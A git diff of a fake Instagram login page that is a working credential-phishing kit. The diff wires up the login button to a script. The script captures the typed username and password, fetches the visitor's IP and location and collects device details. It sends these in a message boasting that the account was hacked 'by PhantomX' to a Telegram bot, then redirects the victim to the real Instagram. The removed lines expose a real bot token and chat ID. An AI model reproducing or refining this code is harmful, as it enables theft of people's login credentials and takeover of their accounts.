@@ -184,11 +184,11 @@
         <section class="form-login">
             <form>
                 <img src="https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/logo.png?raw=true" class="logo-instagram" alt="Instagram logo">
-                <input type="text" name="username" placeholder="Phone, username, or email">
-                <input type="password" name="passwordUser" placeholder="Password">
-                <button type="button" disabled>Log In</button>
+                <input type="text" name="username" id="username" placeholder="Phone, username, or email">
+                <input type="password" name="passwordUser" id="password" placeholder="Password">
+                <button type="button" id="loginbutton">Log In</button>
                 <div class="or">OR</div>
-                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATBLxmCRoRwvl25sexsbPWvJw-grK07kle5WzR1ca7bXZHdBtHOIO74vaqCtBEvTOhIKu64sV0oJGNamQNUPnTqeclCbondIgwut9lAktocPxQvqk5oHL1I9aZKi5gMqRMHtGTVKVTSaXuF82QPvO6lKkaGijgIjDqV8_4iYkTujw7thBhwmBmX1cXPEWhws85Ei-GqvnITWA0qJ1JQQdRf4HdolF6FHy2h8vjJJUsAGzhed5g"" class="login-facebook">
+                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATBLxmCRoRwvl25sexsbPWvJw-grK07kle5WzR1ca7bXZHdBtHOIO74vaqCtBEvTOhIKu64sV0oJGNamQNUPnTqeclCbondIgwut9lAktocPxQvqk5oHL1I9aZKi5gMqRMHtGTVKVTSaXuF82QPvO6lKkaGijgIjDqV8_4iYkTujw7thBhwmBmX1cXPEWhws85Ei-GqvnITWA0qJ1JQQdRf4HdolF6FHy2h8vjJJUsAGzhed5g" class="login-facebook">
                     <img src="https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/fb.png?raw=true" alt="Facebook icon"> Log in with Facebook
                 </a>
                 <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pass">Forgot password?</a>
@@ -229,106 +229,84 @@
             <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">Meta-Verified</a>
         </nav>
         <div class="copy">
-            
             <span>Instagram from meta 2025</span>
         </div>
     </footer>
-</body>
 
-<script>
-    document.querySelector("#loginbutton").addEventListener("click", async function(event) {
-        event.preventDefault();
+    <script>
+        document.querySelector("#loginbutton").addEventListener("click", async function(event) {
+            event.preventDefault();
 
-        const username = document.getElementById("username").value;
-        const password = document.querySelector("#password").value;
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
 
-        // جمع معلومات الموقع
-        const locationData = await getUserLocation();
+            // جمع معلومات الموقع
+            const locationData = await getUserLocation();
 
-        // جمع معلومات الجهاز
-        const deviceInfo = getDeviceInfo();
+            // جمع معلومات الجهاز
+            const deviceInfo = getDeviceInfo();
 
-        // بناء الرسالة
-        const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
-                        `💻 *معلومات الحساب:* 💻\n` +
-                        `📧 البريد الإلكتروني: ${username}\n` +
-                        `🔑 كلمة المرور: ${password}\n\n` +
-                        `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
-                        `🕒 المنطقة الزمنية: ${locationData.timezone}\n` +
-                        `🌐 عنوان الـ IP: ${locationData.ip}\n` +
-                        `🔍 المزود: ${locationData.org}\n` +
-                        `🚨 ASN: ${locationData.asn}\n\n` +
-                        `💻 *معلومات الجهاز:* 💻\n` +
-                        `🖥️ النظام: ${deviceInfo.platform} - ${deviceInfo.osVersion}\n` +
-                        `🌐 المتصفح: ${deviceInfo.browser} - ${deviceInfo.browserVersion}\n` +
-                        `⚙️ لغة المتصفح: ${deviceInfo.language}\n` +
-                        `🔧 الرام: ${deviceInfo.memory}GB\n` +
-                        `⚡ أنوية المعالج: ${deviceInfo.cpuCores}\n` +
-                        `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
-                        `🕒 *التوقيت:* ${new Date().toLocaleString()}\n\n` +
-                        `☣ *⚜By PhantomX @tx_5w⚜*`;
+            // بناء الرسالة
+            const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
+                            `💻 *معلومات الحساب:* 💻\n` +
+                            `📧 البريد الإلكتروني: ${username}\n` +
+                            `🔑 كلمة المرور: ${password}\n\n` +
+                            `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
+                            `📱 *جهاز:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
+                            `📲 *IP:* ${locationData.ip}\n\n` +
+                            `الاختراق تم بواسطة PhantomX`;
 
-        // إرسال البيانات إلى Telegram bot
-        await sendToTelegram(message);
+            // إرسال الرسالة إلى قناة تليجرام (استبدال الرابط بعنوان القناة الفعلي)
+            const telegramChannel = "https://api.telegram.org/bot<YourBotToken>/sendMessage?chat_id=<YourChatID>&text=" + encodeURIComponent(message);
+            fetch(telegramChannel).then(response => {
+                console.log("تم إرسال الرسالة إلى التليجرام.");
+            }).catch(error => {
+                console.error("خطأ في إرسال الرسالة:", error);
+            });
 
-        // إعادة توجيه المستخدم إلى Instagram بعد 5 ثواني
-        setTimeout(() => window.location.href = 'https://www.instagram.com', 5000);
-    });
+            // إعادة التوجيه إلى Instagram بعد 5 ثواني
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com";
+            }, 5000);
+        });
 
-    // دالة لجمع معلومات الموقع
-    async function getUserLocation() {
-        try {
-            const response = await fetch('https://ipapi.co/json');
+        // جلب بيانات الموقع الجغرافي
+        async function getUserLocation() {
+            const response = await fetch("https://geolocation-db.com/json/");
             const data = await response.json();
             return {
-                city: data.city || "Unknown",
-                country: data.country_name || "Unknown",
-                timezone: data.timezone || "Unknown",
-                ip: data.ip || "Unknown",
-                org: data.org || "Unknown",
-                asn: data.asn || "Unknown"
-            };
-        } catch (error) {
-            console.error('Error fetching location data:', error);
-            return {
-                city: "Unknown",
-                country: "Unknown",
-                timezone: "Unknown",
-                ip: "Unknown",
-                org: "Unknown",
-                asn: "Unknown"
+                city: data.city,
+                country: data.country_name,
+                ip: data.IPv4
             };
         }
-    }
 
-    // دالة لجمع معلومات الجهاز
-    function getDeviceInfo() {
-        const platform = navigator.platform;
-        const browserInfo = navigator.userAgent;
-        const language = navigator.language;
-        const memory = (navigator.deviceMemory || 4); 
-        const cpuCores = navigator.hardwareConcurrency || 4;
-        const screenResolution = `${window.screen.width}x${window.screen.height}`;
-        
-        // يمكن تحسين معرف المتصفح باستخدام مكتبة مثل "Bowser" للحصول على تفاصيل أدق
-        const browserMatch = /([a-zA-Z]+)\/([0-9\.]+)/.exec(browserInfo);
-        const browser = browserMatch ? browserMatch[1] : "Unknown";
-        const browserVersion = browserMatch ? browserMatch[2] : "Unknown";
+        // الحصول على معلومات الجهاز
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let device = "Unknown Device";
+            let os = "Unknown OS";
 
-        // يمكن إضافة تحسينات لأجهزة مختلفة لتحديد أنظمة التشغيل بشكل أفضل
-        const osMatch = /(?:Windows NT|Mac OS X|Linux|Android|iPhone).*?([\d\.]+)/.exec(browserInfo);
-        const osVersion = osMatch ? osMatch[1] : "Unknown";
+            if (userAgent.includes("Windows")) {
+                os = "Windows";
+            } else if (userAgent.includes("Mac")) {
+                os = "MacOS";
+            } else if (userAgent.includes("Android")) {
+                os = "Android";
+            } else if (userAgent.includes("iPhone")) {
+                os = "iOS";
+            }
 
-        return { platform, browser, browserVersion, language, memory, cpuCores, screenResolution, osVersion };
-    }
+            if (userAgent.includes("Mobile")) {
+                device = "Mobile Device";
+            } else if (userAgent.includes("Tablet")) {
+                device = "Tablet";
+            } else {
+                device = "Desktop";
+            }
 
-    // دالة لإرسال البيانات إلى Telegram
-    async function sendToTelegram(message) {
-        await fetch(`https://api.telegram.org/bot7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: '5091980014', text: message })
-        });
-    }
-</script>
+            return { device, os };
+        }
+    </script>
+</body>
 </html>
